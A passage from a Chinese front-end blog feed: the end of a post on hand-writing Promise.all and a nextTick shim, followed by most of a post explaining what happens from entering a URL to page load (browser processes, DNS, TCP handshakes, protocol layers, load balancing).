用MutationObserver实现浏览器上的nextTick</span></span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(fn);</span><br><span class="line">    <span class="keyword">var</span> textNode = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="title class_">String</span>(counter));</span><br><span class="line"></span><br><span class="line">    observer.<span class="title function_">observe</span>(textNode, &#123;</span><br><span class="line">      <span class="attr">characterData</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line">    textNode.<span class="property">data</span> = <span class="title class_">String</span>(counter);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，如果您想看详细的测试与运行结果，请参见 <a href="https://link.zhihu.com/?target=https://github.com/venaissance/ts-source-promise">我的 GitHub →</a></p><hr><p><a name="HjuHV"></a></p><h2 id="手写-Promise-all"><a href="#手写-Promise-all" class="headerlink" title="手写 Promise.all()"></a>手写 Promise.all()</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">PromiseAll</span>(<span class="params">promiseArray</span>) &#123;    <span class="comment">//返回一个Promise对象</span></span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(promiseArray)) &#123;                        <span class="comment">//传入的参数是否为数组</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;传入的参数不是数组！&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> res = []</span><br><span class="line">        <span class="keyword">let</span> counter = <span class="number">0</span>                         <span class="comment">//设置一个计数器</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; promiseArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(promiseArray[i]).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">                counter++                  <span class="comment">//使用计数器返回 必须使用counter</span></span><br><span class="line">                res[i] = value</span><br><span class="line">                <span class="keyword">if</span> (counter === promiseArray.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(res)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="title function_">reject</span>(e))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上为核心实现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">res</span>(<span class="string">&#x27;p1&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">res</span>(<span class="string">&#x27;p2&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p3 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">res</span>(<span class="string">&#x27;p3&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> test = <span class="title class_">PromiseAll</span>([p1, p2, p3])</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test);</span><br></pre></td></tr></table></figure><p><a name="C9epL"></a></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>总结一下，会手写关键代码对技术发展的重要性是不言而喻的，所以大家一定要勇于克服自己内心的恐惧，<strong>刻意练习</strong>，终有一天，你会体会到技术精进的快感！</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> js </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从输入url到页面加载</title>
      <link href="/2020/04/08/frontend/browser/cong-shu-ru-url-dao-ye-mian-jia-zai/"/>
      <url>/2020/04/08/frontend/browser/cong-shu-ru-url-dao-ye-mian-jia-zai/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="section-3"></a></p><h2 id="对知识体系进行一次预评级"><a href="#对知识体系进行一次预评级" class="headerlink" title="对知识体系进行一次预评级"></a>对知识体系进行一次预评级</h2><p>看到这道题目，不借助搜索引擎，自己的心里是否有一个答案？<br />这里，以目前的经验（了解过一些处于不同阶段的相关前端人员的情况），大概有以下几种情况：（以下都是以点见面，实际上不同阶段人员一般都会有其它的隐藏知识点的）<br><a name="section-3-1"></a></p><h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a><strong>level1:</strong></h3><p>完全没什么概念的，支支吾吾的回答，一般就是这种水平（大致形象点描述）：</p><blockquote><ul><li>浏览器发起请求</li><li>服务端返回数据</li><li>前端解析成网页，执行脚本。。。</li></ul></blockquote><p>这类人员一般都是：</p><ul><li>萌新（刚接触前端的，包括 0-6 个月都有可能有这种回答）</li><li>沉淀人员（就是那种可能已经接触了前端几年，但是仍然处于初级阶段的那种。。。）</li></ul><p>当然了，后者一般还会偶尔提下<code>**http**</code><strong>、</strong><code>**后台**</code><strong>、</strong><code>**浏览器渲染**</code><strong>，</strong><code>**js引擎**</code>等等关键字，但基本都是一详细的问就不知道了。。。</p><p><a name="section-3-2"></a></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a><strong>level2:</strong></h3><p>已经有初步概念，但是可能没有完整梳理过，导致无法形成一个完整的体系，或者是很多细节都不会展开，大概是这样子的：（可能符合若干条）</p><blockquote><ul><li>知道浏览器输入 url 后会有 http 请求这个概念</li><li>有后台这个概念，大致知道前后端的交互，知道前后端只要靠 http 报文通信</li><li>知道浏览器接收到数据后会进行解析，有一定概念，但是具体流程不熟悉（如 render 树构建流程，layout、paint，复合层与简单层，常用优化方案等不是很熟悉）</li><li>对于 js 引擎的解析流程有一定概念，但是细节不熟悉（如具体的形参，函数，变量提升，执行上下文以及 VO、AO、作用域链，回收机制等概念不是很熟悉）</li><li>如可能知道一些 http 规范初步概念，但是不熟悉（如 http 报文结构，常用头部，缓存机制，http2.0，https 等特性，跨域与 web 安全等不是很熟悉）</li></ul></blockquote><p>到这里，看到这上面一大堆的概念后，心里应该也会有点底了。。。<br /><strong>实际上，大部分的前端人员可能都处于 level2</strong>，但是，跳出这个阶段并不容易，一般需要积累，不断学习，才能水到渠成<br />这类人员一般都是：</p><ul><li>工作 1-3 年左右的普通人员（占大多数，而且大多数人员工作 3 年左右并没有实质上的提升）</li><li>工作 3 年以上的老人（这部分人大多都业务十分娴熟，一个当好几个用，但是，基础比较薄弱，可能没有尝试写过框架、组件、脚手架等）</li></ul><p>大部分的初中级都陷在这个阶段，如果要突破，不断学习，积累，自然能水到渠成，打通任督二脉</p><p><a name="section-3-3"></a></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a><strong>level3:</strong></h3><p>基本能到这一步的，不是高阶就是接近高阶，因为很多概念并不是靠背就能理解的，而要理解这么多，需形成体系，一般都需要积累，非一日之功。<br />一般包括什么样的回答呢？（这里就以自己的简略回答进行举例），一般这个阶段的人员都会符合若干条（不一定全部，当然可能还有些是这里遗漏的）:</p><blockquote><ul><li>首先略去那些键盘输入、和操作系统交互、以及屏幕显示原理、网卡等硬件交互之类的（前端向中，很多硬件原理暂时略去。。。）</li><li>对浏览器模型有整体概念，知道浏览器是多进程的，浏览器内核是多线程的，清楚进程与线程之间得区别，以及输入 url 后会开一个新的网络线程</li><li>对从开启网络线程到发出一个完整的 http 请求中间的过程有所了解（如 dns 查询，tcp&#x2F;ip 链接，五层因特网协议栈等等，以及一些优化方案，如<code>dns-prefetch</code>）</li><li>对从服务器接收到请求到对应后台接收到请求有一定了解（如负载均衡，安全拦截以及后台代码处理等）</li><li>对后台和前台的 http 交互熟悉（包括 http 报文结构，场景头部，cookie，跨域，web 安全，http 缓存，http2.0，https 等）</li><li>对浏览器接收到 http 数据包后的解析流程熟悉（包括解析 html，词法分析然后解析成 dom 树、解析 css 生成 css 规则树、合并成 render 树，然后 layout、painting 渲染、里面可能还包括复合图层的合成、GPU 绘制、外链处理、加载顺序等）</li><li>对 JS 引擎解析过程熟悉（包括 JS 的解释，预处理，执行上下文，VO，作用域链，this，回收机制等）</li></ul></blockquote><p>可以看到，上述包括了一大堆的概念，仅仅是偏前端向，而且没有详细展开，就已经如此之多的概念了，所以，个人认为如果没有自己的见解，没有形成自己的知识体系，仅仅是看看，背背是没用的，过一段时间就会忘光了。<br />再说下一般这个阶段的都可能是什么样的人吧。（不一定准确，这里主要是靠少部分现实以及大部分推测得出）</p><ul><li>工作 2 年以上的前端（基本上如果按正常进度的话，至少接触前端两年左右才会开始走向高阶，当然，现在很多都是上学时就开始学了的，还有部分是天赋异禀，不好预估。。。）</li><li>或者是已经十分熟悉其它某门语言，再转前端的人（基本上是很快就可以将前端水准提升上去）</li></ul><p>一般符合这个条件的都会有各种隐藏属性（如看过各大框架、组件的源码，写过自己的组件、框架、脚手架，做过大型项目，整理过若干精品博文等）</p><p><a name="section-3-4"></a></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a><strong>level4:</strong></h3><p>由于本人层次尚未达到，所以大致说下自己的见解吧。<br />一般这个层次，很多大佬都并不仅仅是某个技术栈了，而是成为了技术专家，技术 leader 之类的角色。所以仅仅是回答某个技术问题已经无法看出水准了， 可能更多的要看架构，整体把控，大型工程构建能力等等<br />不过，对于某些执着于技术的大佬，大概会有一些回答吧：（猜的）</p><blockquote><ul><li>从键盘谈起到系统交互</li><li>从浏览器到 CPU</li><li>从调度机制到系统内核</li><li>从数据请求到二进制、汇编</li><li>从 GPU 绘图到 LCD 显示</li><li>然后再分析系统底层的进程、内存等等</li></ul></blockquote><p>总之，从软件到硬件，到材料，到分子，原子，量子，薛定谔的猫，人类起源，宇宙大爆炸，平行宇宙？感觉都毫无违和感。。。<br />这点可以参考下本题的原始出处：<br /><a href="http://fex.baidu.com/blog/2014/05/what-happen/">从输入 URL 到页面加载完成的过程中都发生了什么事情？</a></p><p><a name="section-4"></a></p><h2 id="为什么说知识体系如此重要？"><a href="#为什么说知识体系如此重要？" class="headerlink" title="为什么说知识体系如此重要？"></a>为什么说知识体系如此重要？</h2><p>为什么说知识体系如此重要呢？这里举几个例子<br />假设有被问到这样一道题目（随意想到的一个）：</p><ul><li>如何理解<code>getComputedStyle</code></li></ul><p>在尚未梳理知识体系前，大概会这样回答：</p><ul><li>普通版本：<code>getComputedStyle</code>会获取当前元素所有最终使用的 CSS 属性值（最终计算后的结果），通过<code>window.getComputedStyle</code>等价于<code>document.defaultView.getComputedStyle</code>调用</li><li>详细版本：<code>window.getComputedStyle(elem, null).getPropertyValue(&quot;height&quot;)</code>可能的值为<code>100px</code>，而且，就算是 css 上写的是<code>inherit</code>，<code>getComputedStyle</code>也会把它最终计算出来的。不过注意，如果元素的背景色透明，那么<code>getComputedStyle</code>获取出来的就是透明的这个背景（因为透明本身也是有效的），而不会是父节点的背景。所以它不一定是最终显示的颜色。</li></ul><p>就这个 API 来说，上述的回答已经比较全面了。<br />但是，其实它是可以继续延伸的。<br />譬如现在会这样回答：</p><ul><li><code>getComputedStyle</code>会获取当前元素所有最终使用的 CSS 属性值，<code>window.</code>和<code>document.defaultView.</code>等价…</li><li><code>getComputedStyle</code>会引起回流，因为它需要获取祖先节点的一些信息进行计算（譬如宽高等），所以用的时候慎用，回流会引起性能问题。然后合适的话会将话题引导回流，重绘，浏览器渲染原理等等。当然也可以列举一些其它会引发回流的操作，如<code>offsetXXX</code>，<code>scrollXXX</code>，<code>clientXXX</code>，<code>currentStyle</code>等等</li></ul><p>再举一个例子：</p><ul><li><code>visibility: hidden</code>和<code>display: none</code>的区别</li></ul><p>可以如下回答：</p><ul><li>普通回答，一个隐藏，但占据位置，一个隐藏，不占据位置</li><li>进一步，<code>display</code>由于隐藏后不占据位置，所以造成了 dom 树的改变，会引发回流，代价较大</li><li>再进一步，当一个页面某个元素经常需要切换<code>display</code>时如何优化，一般会用复合层优化，或者要求低一点用<code>absolute</code>让其脱离普通文档流也行。然后可以将话题引到普通文档流，<code>absolute</code>文档流，复合图层的区别，</li><li>再进一步可以描述下浏览器渲染原理以及复合图层和普通图层的绘制区别（复合图层单独分配资源，独立绘制，性能提升，但是不能过多，还有隐式合成等等）</li></ul><p>上面这些大概就是知识系统化后的回答，会更全面，容易由浅入深，而且一有机会就可以往更底层挖<br><a name="section-4-1"></a></p><h3 id="前端向知识的重点"><a href="#前端向知识的重点" class="headerlink" title="前端向知识的重点"></a>前端向知识的重点</h3><p><strong>此部分的内容是站在个人视角分析的，并不是说就一定是正确答案</strong><br />首先明确，计算机方面的知识是可以无穷无尽的挖的，而本文的重点是梳理<strong>前端向</strong>的重点知识<br />对于<strong>前端向</strong>（这里可能没有提到<code>node.js</code>之类的，更多的是指客户端前端），这里将知识点按重要程度划分成以下几大类：</p><ul><li>核心知识，必须掌握的，也是最基础的，譬如浏览器模型，渲染原理，JS 解析过程，JS 运行机制等，作为骨架来承载知识体系</li><li>重点知识，往往每一块都是一个知识点，而且这些知识点都很重要，譬如 http 相关，web 安全相关，跨域处理等</li><li>拓展知识，这一块可能更多的是了解，稍微实践过，但是认识上可能没有上面那么深刻，譬如五层因特网协议栈，hybrid 模式，移动原生开发，后台相关等等（当然，在不同领域，可能有某些知识就上升到重点知识层次了，譬如 hybrid 开发时，懂原生开发是很重要的）</li></ul><p>为什么要按上面这种方式划分？<br />这大概与个人的技术成长有关。<br />记得最开始学前端知识时，是一点一点的积累，一个知识点一个知识点的攻克。<br />就这样，虽然在很长一段时间内积累了不少的知识，但是，总是无法将它串联到一起。每次梳理时都是很分散的，无法保持思路连贯性。<br />直到后来，在将浏览器渲染原理、JS 运行机制、JS 引擎解析流程梳理一遍后，感觉就跟打通了任督二脉一样，有了一个整体的架构，以前的知识点都连贯起来了。<br />梳理出了一个知识体系，以后就算再学新的知识，也会尽量往这个体系上靠拢，环环相扣，更容易理解，也更不容易遗忘<br><a name="section-5"></a></p><h2 id="梳理主干流程"><a href="#梳理主干流程" class="headerlink" title="梳理主干流程"></a>梳理主干流程</h2><p>回到这道题上，如何回答呢？先梳理一个骨架<br />知识体系中，最重要的是骨架，脉络。有了骨架后，才方便填充细节。所以，先梳理下主干流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 从浏览器接收url到开启网络请求线程（这一部分可以展开浏览器的机制以及进程与线程之间的关系）</span><br><span class="line">2. 开启网络线程到发出一个完整的http请求（这一部分涉及到dns查询，tcp/ip请求，五层因特网协议栈等知识）</span><br><span class="line">3. 从服务器接收到请求到对应后台接收到请求（这一部分可能涉及到负载均衡，安全拦截以及后台内部的处理等等）</span><br><span class="line">4. 后台和前台的http交互（这一部分包括http头部、响应码、报文结构、cookie等知识，可以提下静态资源的cookie优化，以及编码解码，如gzip压缩等）</span><br><span class="line">5. 单独拎出来的缓存问题，http的缓存（这部分包括http缓存头部，etag，catch-control等）</span><br><span class="line">6. 浏览器接收到http数据包后的解析流程（解析html-词法分析然后解析成dom树、解析css生成css规则树、合并成render树，然后layout、painting渲染、复合图层的合成、GPU绘制、外链资源的处理、loaded和domcontentloaded等）</span><br><span class="line">7. CSS的可视化格式模型（元素的渲染规则，如包含块，控制框，BFC，IFC等概念）</span><br><span class="line">8. JS引擎解析过程（JS的解释阶段，预处理阶段，执行阶段生成执行上下文，VO，作用域链、回收机制等等）</span><br><span class="line">9. 其它（可以拓展不同的知识模块，如跨域，web安全，hybrid模式等等内容）</span><br></pre></td></tr></table></figure><p>梳理出主干骨架，然后就需要往骨架上填充细节内容<br><a name="section-6"></a></p><h2 id="从浏览器接收-url-到开启网络请求线程"><a href="#从浏览器接收-url-到开启网络请求线程" class="headerlink" title="从浏览器接收 url 到开启网络请求线程"></a>从浏览器接收 url 到开启网络请求线程</h2><p>这一部分展开的内容是：浏览器进程&#x2F;线程模型，JS 的运行机制<br><a name="section-6-1"></a></p><h3 id="多进程的浏览器"><a href="#多进程的浏览器" class="headerlink" title="多进程的浏览器"></a>多进程的浏览器</h3><p>浏览器是多进程的，有一个主控进程，以及每一个 tab 页面都会新开一个进程（某些情况下多个 tab 会合并进程）<br />进程可能包括主控进程，插件进程，GPU，tab 页（浏览器内核）等等</p><ul><li>Browser 进程：浏览器的主进程（负责协调、主控），只有一个</li><li>第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建</li><li>GPU 进程：最多一个，用于 3D 绘制</li><li>浏览器渲染进程（内核）：默认每个 Tab 页面一个进程，互不影响，控制页面渲染，脚本执行，事件处理等（有时候会优化，如多个空白 tab 会合并成一个进程）</li></ul><p>如下图：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596828180-d5b4f0a9-fafc-4381-a27e-831c7edb58ab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596828180-d5b4f0a9-fafc-4381-a27e-831c7edb58ab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-6-2"></a></p><h3 id="多线程的浏览器内核"><a href="#多线程的浏览器内核" class="headerlink" title="多线程的浏览器内核"></a>多线程的浏览器内核</h3><p>每一个 tab 页面可以看作是浏览器内核进程，然后这个进程是多线程的，它有几大类子线程</p><ul><li>GUI 线程</li><li>JS 引擎线程</li><li>事件触发线程</li><li>定时器线程</li><li>网络请求线程</li></ul><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596833651-e63a1e70-79f0-400c-8d54-6e5548d39d9e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596833651-e63a1e70-79f0-400c-8d54-6e5548d39d9e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />可以看到，里面的 JS 引擎是内核进程中的一个线程，这也是为什么常说 JS 引擎是单线程的<br><a name="section-6-3"></a></p><h3 id="解析-URL"><a href="#解析-URL" class="headerlink" title="解析 URL"></a>解析 URL</h3><p>输入 URL 后，会进行解析（URL 的本质就是统一资源定位符）<br />URL 一般包括几大部分：</p><ul><li><code>protocol</code>，协议头，譬如有 http，ftp 等</li><li><code>host</code>，主机域名或 IP 地址</li><li><code>port</code>，端口号</li><li><code>path</code>，目录路径</li><li><code>query</code>，即查询参数</li><li><code>fragment</code>，即<code>#</code>后的 hash 值，一般用来定位到某个位置<br><a name="section-6-4"></a></li></ul><h3 id="网络请求都是单独的线程"><a href="#网络请求都是单独的线程" class="headerlink" title="网络请求都是单独的线程"></a>网络请求都是单独的线程</h3><p>每次网络请求时都需要开辟单独的线程进行，譬如如果 URL 解析到 http 协议，就会新建一个网络线程去处理资源下载<br />因此浏览器会根据解析出得协议，开辟一个网络线程，前往请求资源（这里，暂时理解为是浏览器内核开辟的，如有错误，后续修复）<br><a name="section-6-5"></a></p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>由于篇幅关系，这里就大概介绍一个主干流程，关于浏览器的进程机制，更多可以参考以前总结的一篇文章（因为内容实在过多，里面包括 JS 运行机制，进程线程的详解）<br /><a href="https://segmentfault.com/a/1190000012925872">从浏览器多进程到 JS 单线程，JS 运行机制最全面的一次梳理</a><br><a name="section-7"></a></p><h2 id="开启网络线程到发出一个完整的-http-请求"><a href="#开启网络线程到发出一个完整的-http-请求" class="headerlink" title="开启网络线程到发出一个完整的 http 请求"></a>开启网络线程到发出一个完整的 http 请求</h2><p>这一部分主要内容包括：<code>dns</code>查询，<code>tcp/ip</code>请求构建，<code>五层因特网协议栈</code>等等<br />仍然是先梳理主干，有些详细的过程不展开（因为展开的话内容过多）<br><a name="section-7-1"></a></p><h3 id="DNS-查询得到-IP"><a href="#DNS-查询得到-IP" class="headerlink" title="DNS 查询得到 IP"></a>DNS 查询得到 IP</h3><p>如果输入的是域名，需要进行 dns 解析成 IP，大致流程：</p><ul><li>如果浏览器有缓存，直接使用浏览器缓存，否则使用本机缓存，再没有的话就是用 host</li><li>如果本地没有，就向 dns 域名服务器查询（当然，中间可能还会经过路由，也有缓存等），查询到对应的 IP</li></ul><p>注意，域名查询时有可能是经过了 CDN 调度器的（如果有 cdn 存储功能的话）<br />而且，需要知道 dns 解析是很耗时的，因此如果解析域名过多，会让首屏加载变得过慢，可以考虑<code>dns-prefetch</code>优化<br />这一块可以深入展开，具体请去网上搜索，这里就不占篇幅了（网上可以看到很详细的解答）<br><a name="section-7-2"></a></p><h3 id="tcp-x2F-ip-请求"><a href="#tcp-x2F-ip-请求" class="headerlink" title="tcp&#x2F;ip 请求"></a>tcp&#x2F;ip 请求</h3><p>http 的本质就是<code>tcp/ip</code>请求<br />需要了解 3 次握手规则建立连接以及断开连接时的四次挥手<br />tcp 将 http 长报文划分为短报文，通过三次握手与服务端建立连接，进行可靠传输<br /><strong>三次握手的步骤：（抽象派）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：hello，你是server么？</span><br><span class="line">服务端：hello，我是server，你是client么</span><br><span class="line">客户端：yes，我是client</span><br></pre></td></tr></table></figure><p>建立连接成功后，接下来就正式传输数据<br />然后，待到断开连接时，需要进行四次挥手（因为是全双工的，所以需要四次挥手）<br /><strong>四次挥手的步骤：（抽象派）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主动方：我已经关闭了向你那边的主动通道了，只能被动接收了</span><br><span class="line">被动方：收到通道关闭的信息</span><br><span class="line">被动方：那我也告诉你，我这边向你的主动通道也关闭了</span><br><span class="line">主动方：最后收到数据，之后双方无法通信</span><br></pre></td></tr></table></figure><p><strong>tcp&#x2F;ip 的并发限制</strong><br />浏览器对同一域名下并发的 tcp 连接是有限制的（2-10 个不等）<br />而且在 http1.0 中往往一个资源下载就需要对应一个 tcp&#x2F;ip 请求<br />所以针对这个瓶颈，又出现了很多的资源优化方案<br /><strong>get 和 post 的区别</strong><br />get 和 post 虽然本质都是 tcp&#x2F;ip，但两者除了在 http 层面外，在 tcp&#x2F;ip 层面也有区别。<br />get 会产生一个 tcp 数据包，post 两个<br />具体就是：</p><ul><li>get 请求时，浏览器会把<code>headers</code>和<code>data</code>一起发送出去，服务器响应 200（返回数据），</li><li>post 请求时，浏览器先发送<code>headers</code>，服务器响应<code>100 continue</code>， 浏览器再发送<code>data</code>，服务器响应 200（返回数据）。</li></ul><p>再说一点，这里的区别是<code>specification</code>（规范）层面，而不是<code>implementation</code>（对规范的实现）<br><a name="section-7-3"></a></p><h3 id="五层因特网协议栈"><a href="#五层因特网协议栈" class="headerlink" title="五层因特网协议栈"></a>五层因特网协议栈</h3><p>其实这个概念挺难记全的，记不全没关系，但是要有一个整体概念<br />其实就是一个概念： <strong>从客户端发出 http 请求到服务器接收，中间会经过一系列的流程。</strong><br />简括就是：<br /><strong>从应用层的发送 http 请求，到传输层通过三次握手建立 tcp&#x2F;ip 连接，再到网络层的 ip 寻址，再到数据链路层的封装成帧，最后到物理层的利用物理介质传输。</strong><br />当然，服务端的接收就是反过来的步骤<br />五层因特网协议栈其实就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.应用层(dns,http) DNS解析成IP并发送http请求</span><br><span class="line">2.传输层(tcp,udp) 建立tcp连接（三次握手）</span><br><span class="line">3.网络层(IP,ARP) IP寻址</span><br><span class="line">4.数据链路层(PPP) 封装成帧</span><br><span class="line">5.物理层(利用物理介质传输比特流) 物理传输（然后传输的时候通过双绞线，电磁波等各种介质）</span><br></pre></td></tr></table></figure><p>当然，其实也有一个完整的 OSI 七层框架，与之相比，多了会话层、表示层。<br />OSI 七层框架：<code>物理层</code>、<code>数据链路层</code>、<code>网络层</code>、<code>传输层</code>、<code>会话层</code>、<code>表示层</code>、<code>应用层</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表示层：主要处理两个通信系统中交换信息的表示方式，包括数据格式交换，数据加密与解密，数据压缩与终端类型转换等</span><br><span class="line">会话层：它具体管理不同用户和进程之间的对话，如控制登陆和注销过程</span><br></pre></td></tr></table></figure><p><a name="section-8"></a></p><h2 id="从服务器接收到请求到对应后台接收到请求"><a href="#从服务器接收到请求到对应后台接收到请求" class="headerlink" title="从服务器接收到请求到对应后台接收到请求"></a>从服务器接收到请求到对应后台接收到请求</h2><p>服务端在接收到请求时，内部会进行很多的处理<br />这里由于不是专业的后端分析，所以只是简单的介绍下，不深入<br><a name="section-9"></a></p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>对于大型的项目，由于并发访问量很大，所以往往一台服务器是吃不消的，所以一般会有若干台服务器组成一个集群，然后配合反向代理实现负载均衡<br />当然了，负载均衡不止这一种实现方式，这里不深入…<br />简单的说：<br /><strong>用户发起的请求都指向调度服务器（反向代理服务器，譬如安装了 nginx 控制负载均衡），然后调度服务器根据实际的调度算法，分配不同的请求给对应集群中的服务器执行，然后调度器等待实际服务器的 HTTP 响应，并将它反馈给用户</strong><br><a name="section-10"></a></p><h2 id="后台的处理"><a href="#后台的处理" class="headerlink" title="后台的处理"></a>后台的处理</h2><p>一般后台都是部署到容器中的，所以一般为：</p><ul><li>先是容器接受到请求（如 tomcat 容器）</li><li>然后对应容器中的后台程序接收到请求（如 java 